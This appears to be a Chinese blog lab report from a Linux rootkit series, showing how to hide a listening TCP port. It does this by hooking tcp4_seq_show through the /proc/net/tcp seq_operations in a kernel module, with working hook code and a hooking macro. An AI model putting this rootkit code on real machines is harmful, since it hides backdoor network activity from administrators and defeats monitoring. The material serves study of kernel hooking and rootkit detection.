---
category: rootkit
title: Linux Rootkit 实验 | 00024 Rootkit 基本功能实现x隐藏端口
---

# {{ page.title }}

> 昨夜西风凋碧树。独上高楼，望尽天涯路。

## 实验说明

本次实验将初步实现 rootkit 的基本功能：

- 阻止其他内核模块加载
- 提供 root 后门
- 隐藏文件
- 隐藏进程
- 隐藏端口
- 隐藏内核模块

本次实验基于 0001 实验中学习的挂钩技术。

注：由于本次实验内容过多，故分为`00020`到`00025`六个实验报告分别讲解。

**本节实现“隐藏端口”功能**

## 实验环境

```
uname -a:
Linux kali 4.6.0-kali1-amd64 #1 SMP Debian 4.6.4-1kali1 (2016-07-21) x86_64 GNU/Linux

GCC version:6.1.1
```

上述环境搭建于虚拟机，另外在没有特殊说明的情况下，均以 root 权限执行。

**注：后面实验参考的是4.10.10的源码**

## 实验过程

### 隐藏端口

用户态下隐藏端口信息，就是把`/proc/`下端口相关信息过滤掉。具体来说，看下面一张表格：

|网络类型|对应/proc|内核源码文件|主要实现函数|
|:-:|:-:|:-:|:-:|
|TCP/IPv4|/proc/net/tcp|net/ipv4/tcp_ipv4.c|tcp4_seq_show|
|TCP/IPv6|/proc/net/tcp6|net/ipv6/tcp_ipv6.c|tcp6_seq_show|
|UDP/IPv4|/proc/net/udp|net/ipv4/udp.c|udp4_seq_show|
|UDP/IPv6|/proc/net/udp6|net/ipv6/udp.c|udp6_seq_show|

可以看一下`net/ipv4/tcp.c`和`net/ipv4/tcp_ipv4.c`的开头注释，列举了 TCP/IP 协议栈的开发者们。

下面我们以表格第一行的`IPv4`版本`TCP`为例，做端口隐藏实验。

首先看一下`cat /proc/net/tcp`：

![]({{ site.url }}/images/LinuxRootkits/linux-rkt-26.png)

我们再看一下`tcp4_seq_show`：

{% highlight c %}
// net/ipv4/tcp_ipv4.c
#define TMPSZ 150
static int tcp4_seq_show(struct seq_file *seq, void *v)
{
	struct tcp_iter_state *st;
	struct sock *sk = v;

	seq_setwidth(seq, TMPSZ - 1);
	if (v == SEQ_START_TOKEN) {
		seq_puts(seq, "  sl  local_address rem_address   st tx_queue "
			   "rx_queue tr tm->when retrnsmt   uid  timeout "
			   "inode");
		goto out;
	}
	st = seq->private;

	if (sk->sk_state == TCP_TIME_WAIT)
		get_timewait4_sock(v, seq, st->num);
	else if (sk->sk_state == TCP_NEW_SYN_RECV)
		get_openreq4(v, seq, st->num);
	else
		get_tcp4_sock(v, seq, st->num);
out:
	seq_pad(seq, '\n');
	return 0;
}
// fs/seq_file.c
void seq_puts(struct seq_file *m, const char *s)
{
	int len = strlen(s);

	if (m->count + len >= m->size) {
		seq_set_overflow(m);
		return;
	}
	memcpy(m->buf + m->count, s, len);
	m->count += len;
}
{% endhighlight %}

可以看到，这个函数正是用来向用户层`/proc`暴露网络信息的接口，它的意义也很好理解——每次写一行。我们再跟进看一下`seq_file`：

{% highlight c %}
// include/linux/seq_file.h
struct seq_file {
	char *buf; // 缓冲区
	size_t size; // 缓冲区容量
	size_t from;
	size_t count; // 缓冲区已经使用的量
	size_t pad_until;
	loff_t index;
	loff_t read_pos;
	u64 version;
	struct mutex lock;
	const struct seq_operations *op;
	int poll_event;
	const struct file *file;
	void *private;
};

struct seq_operations {
	void * (*start) (struct seq_file *m, loff_t *pos);
	void (*stop) (struct seq_file *m, void *v);
	void * (*next) (struct seq_file *m, void *v, loff_t *pos);
	int (*show) (struct seq_file *m, void *v);
};
{% endhighlight %}

是不是和之前见过的`file_operations`很像！！！内核看来是有迹可循的！

`tcp4_seq_show`就是`seq_operations`中的`show`函数。

老套路，我们钩掉它，就 OK。开始工作！

首先看一下假的`show`：

{% highlight c %}
#define NEEDLE_LEN  6
#define SECRET_PORT 10000
#define TMPSZ

int (*real_seq_show)(struct seq_file *seq, void *v);
int fake_seq_show(struct seq_file *seq, void *v) 
{
    int ret;
    char needle[NEEDLE_LEN];
    snprintf(needle, NEEDLE_LEN, ":%04X", SECRET_PORT);
    ret = real_seq_show(seq, v); 

    if(strnstr(seq->buf + seq->count - TMPSZ, needle, TMPSZ)){
        printk("Hiding port %d using needle %s.\n", \
                SECRET_PORT, needle);
        seq->count -= TMPSZ;
    }   
    return ret;
}
{% endhighlight %}

思路是，先调用真的`show`向`seq`中写入一条记录，然后检查写入的内容中是否有`:10000`这个字符串，如果有，就把`seq->count`这个记录缓冲区已经使用的字节数减去一条记录的长度`TMPSZ`相当于之前写入的无效了；如果没有，就正常放行。

下面是用来钩函数的宏：

{% highlight c %}
#define set_afinfo_seq_op(op, path, afinfo_struct, new, old)    \
    do{ \
        struct file *filp;  \
        afinfo_struct *afinfo;  \
        filp = filp_open(path, O_RDONLY, 0);    \
        if(IS_ERR(filp)){   \
            printk("Failed to open %s with error %ld.\n",   \
                    path, PTR_ERR(filp));   \
            old = NULL; \
        }   \
        else{   \
                afinfo = PDE_DATA(filp->f_path.dentry->d_inode);    \
                old = afinfo->seq_ops.op;   \
                printk("Setting seq_op->" #op " from %p to %p.",    \
                        old, new);  \
                afinfo->seq_ops.op = new;   \
                filp_close(filp, 0);    \
        }   \
    }while(0)
{% endhighlight %}

这个“钩宏”和之前在隐藏文件实验一节中的宏很类似。Linux 中“一切皆文件”，所以先定义两个指针：

{% highlight c %}
// 隐藏端口实验
struct file *filp;
afinfo_struct *afinfo;
// 隐藏文件实验
struct file *filp;
struct file_operations *f_op;
{% endhighlight %}

然后打开文件：

{% highlight c %}
// 隐藏端口实验
// 隐藏文件实验
filp = filp_open(path, O_RDONLY, 0);
{% endhighlight %}

然后用另一个指针从`file`结构体中获得取得文件处理函数结构体，这里有一些差异，因为之前是普通文件，这里是`tcp_seq_afinfo`，也就是流文件：

{% highlight c %}
// 隐藏端口实验
afinfo = PDE_DATA(filp->f_path.dentry->d_inode)
// 隐藏文件实验
f_op = (struct file_operations *)filp->f_op;
{% endhighlight %}

这里的`PDE_DATA`是从`inode`节点获取对应数据的函数。

之后就是重点，替换：

{% highlight c %}
// 隐藏端口实验
old = afinfo->seq_ops.op;
afinfo->seq_ops.op = new;
// 隐藏文件实验
old = f_op->op;
disable_write_protection();
f_op->op = new;
enable_write_protection();
{% endhighlight %}

上面开关写保护是 novice 师傅加的，可能是需要吧。有兴趣的可以自己去掉那两行试试行不行。

最后就是关闭文件了。这么看来，也很好理解。以后要写别的钩子，我们可以参照这个思路来。先找到相关结构体，包括回调函数的，然后打开文件，替换，关闭文件。

最后在入口出口函数中添加调用代码：

{% highlight c %}
#define NET_ENTRY "/proc/net/tcp"
# define SEQ_AFINFO_STRUCT struct tcp_seq_afinfo
// in init
set_afinfo_seq_op(show, NET_ENTRY, SEQ_AFINFO_STRUCT, fake_seq_show, real_seq_show);
// in exit
if(real_seq_show){
    void *dummy;
    set_afinfo_seq_op(show, NET_ENTRY, SEQ_AFINFO_STRUCT, real_seq_show, dummy);
}
{% endhighlight %}

测试结果如下：

我们使用`ncat -4 -l 10000`以`IPv4`形式`TCP`监听`10000`端口，在没有加载模块时，可以查看到端口监听信息：

![]({{ site.url }}/images/LinuxRootkits/linux-rkt-20.png)

在加载模块后，发现端口已经被隐藏：

![]({{ site.url }}/images/LinuxRootkits/linux-rkt-21.png)

同样，此时执行`netstat -tuln`也是看不到的：

![]({{ site.url }}/images/LinuxRootkits/linux-rkt-22.png)

卸载模块后，端口可以被看到：

![]({{ site.url }}/images/LinuxRootkits/linux-rkt-23.png)

## 实验问题

【问题一】

本实验中，端口号也是写死在代码里的。当然，端口号写死的影响不是很大，我们可以预设一些要使用的端口，让它们被过滤掉。但是，考虑改进这一设计，能否在运行时动态选择要隐藏的端口？

## 实验总结与思考

- 从内核源码中看到的`seq_file`让我学会了一种用 C 表达面向对象的编程技巧（这代码，太美了）

{% highlight c %}
struct seq_file {
	...
	const struct seq_operations *op;
	...
};
struct seq_operations {
	void * (*start) (struct seq_file *m, loff_t *pos);
	void (*stop) (struct seq_file *m, void *v);
	void * (*next) (struct seq_file *m, void *v, loff_t *pos);
	int (*show) (struct seq_file *m, void *v);
};
{% endhighlight %}
